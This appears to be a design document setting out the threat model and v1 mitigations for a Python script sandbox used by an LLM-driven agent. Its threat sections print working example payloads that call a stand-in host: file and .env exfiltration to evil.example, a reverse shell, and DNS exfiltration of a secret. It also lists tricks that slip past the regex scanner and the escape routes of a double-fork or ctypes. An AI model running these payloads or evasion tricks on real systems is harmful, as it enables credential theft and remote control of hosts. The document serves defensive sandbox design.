# Security Model — `exec_script` Sandbox (v1)

## Purpose

`exec_script` lets an LLM-powered governance agent run short-lived
Python/JavaScript scripts for data transforms, validation logic, and
light computation. The agent's prompt may contain **adversarial script
source** injected by a compromised LLM, prompt-embedded jailbreak, or
poisoned retrieval context. This document enumerates the threats,
describes what v1 mitigates, and catalogues residual risk that demands
stronger isolation (Docker, WASM, gVisor) before this tool can be used
with untrusted models in production.

---

## Threat Model

### T1 — LLM-Injected Malicious Script

**Scenario:** The LLM (through prompt injection, fine-tuning backdoor,
or RAG-poisoned context) emits source code that reads sensitive files,
exfiltrates environment variables, or establishes reverse shells.

**Examples:**
```python
import os
for root, _, files in os.walk("/etc"):
    for f in files:
        with open(os.path.join(root, f)) as fh:
            requests.post("https://evil.example/collect", data=fh.read())
```

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.example", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

**v1 Mitigations:**
1. **Import scanning** (`policy.py` lines 26–118): A regex-based scanner
   extracts all top-level module names from the source before execution.
   The default policy allows only ~35 safe stdlib modules (json, math,
   csv, re, datetime, collections, etc. — see `schemas.py` line 210).
   Modules like `os`, `subprocess`, `socket`, `http`, `urllib`, `ctypes`,
   `importlib`, `multiprocessing`, `threading`, and `asyncio` are
   denied by default.
2. **`__import__()` detection** (`policy.py` lines 29, 99–101): A
   dedicated regex catches dynamic import builtins, which are also
   denied by default.
3. **Open() tracking** (`policy.py` line 32): The regex pattern for
   `open(` is defined, though file I/O through `io` or `pathlib` is
   permitted by policy. The v1 stance is that `open()` inside the temp
   directory is acceptable; the dangerous vector is `open()` on
   absolute paths outside the sandbox.

**Residual Risk:**
- The import scanner is regex-based, not an AST parser. Clever quoting,
  `getattr(__builtins__, "op" + "en")`, or `exec()` calls will beat it.
- The `io` and `pathlib` modules are on the default allowlist and can
  be used to read arbitrary filesystem paths. A determined attacker
  with `io.open("/etc/passwd")` will succeed.
- No syscall-level filtering (seccomp, pledge, Capsicum) is applied.

**Required for Production:** At minimum, a Docker/OCI container with a
read-only rootfs and no network, or a WASM runtime with WASI
capabilities restricted to stdio only.

---

### T2 — Runaway Resources (CPU / Memory)

**Scenario:** A script contains `while True: pass` or allocates
gigabytes of memory, starving the host.

**v1 Mitigations:**
1. **Wall-clock timeout** (`policy.py` lines 198–213): The default
   policy caps execution at 10 seconds. Users can request shorter
   timeouts down to 100 ms. The sandbox enforces this with
   `asyncio.wait_for` + SIGTERM (grace period 2 s) → SIGKILL
   (`sandbox.py` lines 230–246).
2. **RLIMIT_AS (memory)** on Linux (`sandbox.py` lines 199–207):
   Virtual-memory limit of 512 MiB enforced via `resource.setrlimit`
   in the child process before exec. **Linux only.**
3. **RLIMIT_CPU (CPU time)** on Linux (`sandbox.py` lines 205–207):
   CPU-time limit of 5 seconds, independent of wall-clock timeout.
   Catches `while True: pass` even under no wall-clock timeout.
   **Linux only.**
4. **Source size hard stop** (`policy.py` lines 249–252): Script source
   exceeding 1 MiB is rejected before any subprocess is spawned.

**Residual Risk:**
- **Windows has no `resource` module** (`sandbox.py` lines 30–37). On
  Windows the only guard is the wall-clock timeout + SIGTERM/SIGKILL.
  A script can consume unlimited memory until the timeout fires.
- RLIMIT_AS covers virtual memory, not physical RSS. A script that
  mmaps a large file-backed region could still pressure the page cache.
- Fork bombs are not prevented (the child could `os.fork()` if it
  somehow obtained `os` access).

**Required for Production:** Docker memory/CPU limits (`--memory`,
`--cpus`), or WASM with deterministic resource metering.

---

### T3 — Data Exfiltration via DNS / HTTP

**Scenario:** A script encodes secrets (environment variables, agent
state, database credentials) and sends them to an attacker-controlled
server.

**Examples:**
```python
import urllib.request
urllib.request.urlopen("https://evil.example/?d=" + open(".env").read())
```

```python
import socket
socket.getaddrinfo(f"stolen-{os.environ['SECRET']}.evil.example", 80)
```

**v1 Mitigations:**
1. **Import deny-list**: `urllib`, `http`, `socket`, and `requests`
   (third-party) are not on the default allowlist. An LLM that emits
   `import urllib.request` will be blocked at the policy gate before
   any subprocess starts.
2. **Minimal environment** (`sandbox.py` lines 70–97): The subprocess
   receives only `PATH`, `HOME`, `TEMP`, `TMP`, `TMPDIR`, `LANG`,
   `LC_ALL`, and platform-specific variables (`SYSTEMROOT` on Windows).
   API keys, database URLs, and other secrets are stripped.

**Residual Risk:**
- If an attacker gains access to `dns` or `socket` modules (e.g.,
  through an overly permissive override), DNS tunnelling is trivial.
- `urllib.parse` is on the default allowlist for URL construction
  utilities, but it cannot perform network I/O without another module.
- No network egress filtering at the OS level.

**Required for Production:** Run subprocesses in a network namespace
with no virtual NIC, or use a firewall rule that drops all outbound
traffic from the sandbox UID.

---

### T4 — Persistence in Temporary Files

**Scenario:** A script writes a cron job, a shell rc snippet, or a
systemd unit into a user-writable directory that survives after the
agent process terminates.

**v1 Mitigations:**
1. **Temp directory isolation** (`sandbox.py` lines 282–293): Each
   execution creates a unique `mkdtemp(prefix="neos_exec_")` directory
   with `0o700` permissions. All file I/O is directed there.
2. **Best-effort cleanup** (`sandbox.py` lines 297–311): The `finally`
   block in `run_script` removes all files and the directory. The
   cleanup does NOT recursively walk (only `iterdir()`), which is fine
   since the script creates files inside a dedicated temp dir.
3. **No home directory access**: `HOME` is passed through but the
   working directory is the temp dir. A script that writes to
   `~/` would need to construct an absolute path, and the file I/O
   would succeed (since `io` and `pathlib` are allowed).

**Residual Risk:**
- The cleanup is best-effort. If the agent process crashes between
  file creation and cleanup (e.g., SIGKILL of the agent itself), temp
  files leak. The OS will eventually reclaim them on reboot.
- Nothing prevents writes to absolute paths like `/tmp/persistent.sh`
  or `~/.bashrc` if the script obtains filesystem access. The import
  scanner blocks the obvious network modules but I/O via `pathlib`
  is allowed.

**Required for Production:** Mount the temp directory as a `tmpfs` with
`noexec` and run inside a container with an ephemeral filesystem.

---

### T5 — Subprocess Escape

**Scenario:** A script spawns a child process that outlives the parent
and continues running after the agent considers execution complete.

**v1 Mitigations:**
1. **Import deny-list**: `subprocess`, `os.system`, `os.popen`, and
   `os.exec*` require importing `os` or `subprocess`, which are denied.
2. **Process-group kill** (`sandbox.py` lines 238–246): The timeout
   handler calls `proc.terminate()` then `proc.kill()`. On POSIX, this
   kills only the direct child, not grandchildren spawned via
   `os.fork()` within the script.

**Residual Risk:**
- If `os` is granted via override, `os.fork()` + double-fork daemon
  can escape the process group.
- `ctypes` + `CDLL` can invoke `fork(2)` directly without Python-level
  process management — `ctypes` is denied by default.

**Required for Production:** PID namespace isolation (Docker
`--pid=host` OFF), or a strict seccomp profile that blocks `fork`,
`clone`, and `execve` syscalls.

---

## Defence-in-Depth Summary

| Layer | What It Blocks | Status in v1 |
|-------|---------------|-------------|
| **Import scanning** (`policy.py:26-118`) | `os`, `socket`, `subprocess`, `http`, `urllib`, `ctypes`, `multiprocessing`, `threading`, `asyncio`, `importlib`, `signal`, `pty` | ✅ Implemented (regex, over-approximating) |
| **`__import__` detection** (`policy.py:99-101`) | Dynamic import builtin | ✅ Implemented |
| **Language allowlist** (`policy.py:170-178`) | Execution of non-Python interpreters | ✅ Implemented (Python only by default) |
| **Wall-clock timeout** (`sandbox.py:230-246`) | Infinite loops, sleep bombs | ✅ Implemented (asyncio + SIGTERM → SIGKILL) |
| **RLIMIT_AS / RLIMIT_CPU** (`sandbox.py:194-207`) | Memory/CPU exhaustion | ✅ Linux only; ❌ Windows |
| **Environment stripping** (`sandbox.py:70-97`) | Credential leaks via `os.environ` | ✅ Implemented |
| **Temp directory isolation** (`sandbox.py:282-293`) | Filesystem pollution | ✅ Isolated, best-effort cleanup |
| **Source size cap** (`policy.py:249-252`) | 1 MiB+ payloads | ✅ Implemented |
| **Output truncation** (`policy.py:218-244`) | Context-window stuffing | ✅ 64 KiB default |

| Layer | What It Blocks | Gap |
|-------|---------------|-----|
| **Bytecode / AST scanner** | Evasion of regex scanner | ❌ Regex only; `getattr`, `exec()`, string obfuscation evade it |
| **Network namespace** | DNS / HTTP exfiltration | ❌ No OS-level network isolation |
| **Seccomp / pledge** | Syscall-level block of `open`, `connect`, `fork` | ❌ Not implemented |
| **Container runtime** | Filesystem, process, and network escape | ❌ Bare-metal subprocess only |
| **WASM sandbox** | Full deterministic isolation | ❌ Not integrated |

---

## Operating Guidance

1. **Do not add `os`, `subprocess`, `socket`, `http`, or `urllib`**
   to the import allowlist in production policy. Use the override
   mechanism only in development with hardcoded review.
2. **Deploy on Linux** for RLIMIT enforcement. Windows deployments
   should use Docker as the outer sandbox.
3. **Audit the `allowed_imports` override** in application code.
   Every call site that passes this parameter is a potential
   privilege-escalation point.
4. **Monitor for `__import__` detections** in logs — they are almost
   certainly malicious intent.
5. **Rotate temp directories** — the `neos_exec_*` prefix is cleaned
   best-effort. A cron job removing stale `neos_exec_*` dirs from
   `$TMPDIR` is advisable on long-running agents.
